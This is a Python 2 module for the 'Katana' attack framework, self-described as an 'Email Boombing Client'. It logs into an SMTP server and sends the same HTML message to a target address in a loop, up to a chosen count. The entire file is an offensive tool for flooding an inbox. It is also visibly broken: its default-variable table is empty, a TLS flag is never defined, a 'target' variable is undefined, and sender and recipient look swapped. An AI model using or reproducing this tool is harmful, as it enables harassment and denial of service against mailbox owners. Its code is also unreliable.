# This module requires katana framework 
# https://github.com/RedToor/Katana
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core.Setting import *    #
from core import Errors       #
from core import getFunction  #
import sys                    #
Message=DESIGN()              #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import smtplib                #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

# INFORMATION MODULE
def initialize():
	initialize.Author             ="RedToor"
	initialize.Version            ="2.0"
	initialize.Description        ="Email Boombing Client."
	initialize.CodeName           ="set/em.boom"
	initialize.DateCreation       ="27/08/2015"      
	initialize.LastModification   ="03/05/2016"

	# DEFAULT VARIABLES             VALUE                                       NAME        RQ     DESCRIPTION

# END INFORMATION MODULE

# MAIN FUNCTION
def main(run):
	try:
		# HEAD MODULE
		if run:	actions=raw_input(Message.prompt(initialize.CodeName))
		else  : actions="run"
		if   getFunction.KatanaCheckActionShowOptions(actions):getFunction.ShowOptions(initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionSetValue(actions)   :initialize.DEFAULT_VARIABLE=getFunction.UpdateValue(actions,initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionisBack(actions)     :return
		# END HEAD MODULE
		elif getFunction.runModule(actions):
			Message.run()
			# CODE MODULE    ############################################################################################
			getFunction.live(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
			if True:
				try:
					server = smtplib.SMTP(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
					if initialize.TLS: server.starttls()
					server.login(initialize.DEFAULT_VARIABLE[2][0],initialize.DEFAULT_VARIABLE[3][0])
					Message.loading_file()
					with open(initialize.DEFAULT_VARIABLE[6][0],'r') as body:
						FILE_HTML = ""
						for read_line in body: 
							FILE_HTML += read_line
					message = """\From: %s\nTo: %s\nContent-type: text/html\nSubject: %s\n\n%s""" % (initialize.DEFAULT_VARIABLE[2][0],initialize.DEFAULT_VARIABLE[4][0],initialize.DEFAULT_VARIABLE[5][0],FILE_HTML)
					try:
						many=0
						while(many < int(initialize.DEFAULT_VARIABLE[7][0])):
							many+=1
							server.sendmail(initialize.DEFAULT_VARIABLE[4][0], initialize.DEFAULT_VARIABLE[2][0], message)
							print " "+Suf+" #"+str(many)+" E-Mail was sent."
					except:
						print " "+Bad+" E-Mail not was sent."
					print" "+Suf+" Attack Completed."
					server.quit()
				except smtplib.SMTPAuthenticationError:
					print ' '+Bad+' Authentication Required or Authentication went wrong.\n'
				except:
					error = str(sys.exc_info()[1])
					if error.find("SMTP AUTH extension") >= 0 : 
						print " "+Bad+" TLS error, Starting again with TLS."
						initialize.TLS = True
						main(False)
					Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[6][0])
			# END CODE MODULE ############################################################################################
		else:
			getFunction.KatanaCheckActionGlobalCommands(actions)
	# ERROR GENERAL
	except:
		Errors.Errors(event=sys.exc_info(), info=sys.exc_traceback.tb_lineno)
	# END ERROR GENERAL
	main(True)
# END MAIN FUNCTION

# LINKER FUNCTION
def run(host,port,account,password,subject,filehtml,amount):
	initialize.DEFAULT_VARIABLE [0][0] = host
	initialize.DEFAULT_VARIABLE [1][0] = port
	initialize.DEFAULT_VARIABLE [2][0] = account
	initialize.DEFAULT_VARIABLE [3][0] = password
	initialize.DEFAULT_VARIABLE [4][0] = target
	initialize.DEFAULT_VARIABLE [5][0] = subject
	initialize.DEFAULT_VARIABLE [6][0] = filehtml
	initialize.DEFAULT_VARIABLE [7][0] = amount
	main(False)
# END LINKER FUNCTION
